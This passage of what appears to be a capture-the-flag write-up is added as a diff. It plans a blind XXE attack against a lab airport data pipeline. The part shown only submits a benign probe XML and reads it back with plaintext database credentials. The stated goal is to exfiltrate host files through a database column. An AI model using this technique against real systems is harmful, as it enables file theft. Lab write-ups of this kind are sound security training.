@@ -760,6 +760,66 @@ Key finding: every field is `String`. `transaction_id` is the anchor, set from t
 <div style="page-break-after: always;"></div>
 
 ## 3. Exploitation
+
+### 3.1 Blind XXE via the Downstream Parser
+
+The ingest API stated it does not parse XML and forwards it downstream for validation. That downstream parser is the target: if it resolves external entities, a submitted document can read files off the host, and the parsed result is exfiltrated through the `airline` column in ClickHouse.
+<div align="center">
+<br>
+<br>
+</div>
+
+#### 3.1.1 Confirm the ingestion round-trip
+
+Before weaponizing, prove that attacker-controlled XML content reaches a queryable column. Submit a benign AIDX document with a known `TransactionIdentifier` and a known `Airline` value, then read it back from `flightleg_json`.
+
+**Command:**
+
+```bash
+cat > probe.xml <<'EOF'
+<?xml version="1.0" encoding="UTF-8"?>
+<IATA_AIDX_FlightLegNotifRQ xmlns="http://www.iata.org/IATA/2007/00" Version="22.1"
+  TimeStamp="2026-10-17T12:00:00Z" TransactionIdentifier="probe-01">
+  <Originator><CompanyShortName>TST</CompanyShortName><Code>TS</Code></Originator>
+  <FlightLeg>
+    <LegIdentifier>
+      <Airline CodeContext="3">PROBE</Airline>
+      <FlightNumber>999</FlightNumber>
+      <DepartureAirport CodeContext="3">XXX</DepartureAirport>
+      <ArrivalAirport CodeContext="3">YYY</ArrivalAirport>
+      <OriginDate>2026-10-17</OriginDate>
+      <RepeatNumber>1</RepeatNumber>
+    </LegIdentifier>
+  </FlightLeg>
+</IATA_AIDX_FlightLegNotifRQ>
+EOF
+
+curl -s -X POST http://api.htb-airport.htb:8081/feeds/aidx -H 'Content-Type: application/xml' --data-binary @probe.xml; echo
+
+sleep 6
+curl -sG http://db.htb-airport.htb/ -u 'svc_events:Yl4aCgh4y2PnU' --data-urlencode "query=SELECT transaction_id,airline FROM partner_feed.flightleg_json WHERE transaction_id='probe-01' FORMAT Vertical"
+```
+
+**Breakdown:**
+
+| Component | Purpose | Simple Explanation |
+| --------- | ------- | ------------------ |
+| `cat > probe.xml <<'EOF' ... EOF` | Build the document | Writes a minimal valid AIDX message with a unique `TransactionIdentifier` and a marker `Airline` value. |
+| `curl -X POST .../feeds/aidx --data-binary @probe.xml` | Submit | Posts the XML to the ingest endpoint exactly as written. |
+| `sleep 6` | Wait for the pipeline | Gives Kafka and the materialized view time to parse and insert the row. |
+| `curl -sG ... WHERE transaction_id='probe-01' FORMAT Vertical` | Read back | Queries the parsed row by its id; `FORMAT Vertical` prints one field per line. |
+
+**Result:**
+
+```shell
+{"accepted":true,"topic":"aidx.flightleg.raw.v1"}
+Row 1:
+──────
+transaction_id: probe-01
+airline:        PROBE
+```
+
+Key finding: the value placed in `<Airline>` arrives in the `airline` column keyed by our `transaction_id`. The downstream parser processes attacker-supplied content and the result is queryable, so an external entity placed in that element will have its expansion written where it can be read back.
 <div align="center">
 <br>
 <br>
